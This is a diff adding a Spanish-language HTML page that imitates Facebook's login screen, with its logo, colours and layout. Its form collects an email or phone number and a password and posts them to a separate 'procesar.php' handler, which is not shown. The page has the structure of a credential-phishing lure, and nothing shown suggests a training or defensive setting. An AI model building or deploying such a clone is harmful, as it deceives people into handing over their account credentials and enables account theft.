@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Iniciar Sesión</title>
+<style>
+body{background:#f0f2f5;font-family:Arial;margin:0;padding:20px;text-align:center}
+.logo{color:#1877f2;font-size:40px;font-weight:bold;margin:10px 0}
+form{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);margin:0 auto;max-width:360px;padding:15px}
+input{border:1px solid #ddd;border-radius:5px;box-sizing:border-box;font-size:16px;margin:5px 0;padding:10px;width:100%}
+.btn{background:#1877f2;border:none;border-radius:5px;color:#fff;cursor:pointer;font-size:18px;font-weight:bold;margin:10px 0;padding:10px;width:100%}
+.create{background:#42b72a}
+.link{color:#1877f2;display:block;margin:10px 0;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="logo">FACEBOOK</div>
+<form action="procesar.php" method="POST">
+<input type="text" name="email" placeholder="Correo o teléfono" required>
+<input type="password" name="password" placeholder="Contraseña" required>
+<button type="submit" class="btn">Iniciar sesión</button>
+<a href="#" class="link">¿Olvidaste tu contraseña?</a>
+<hr>
+<button type="button" class="btn create">Crear cuenta</button>
+</form>
+</body>
+</html>
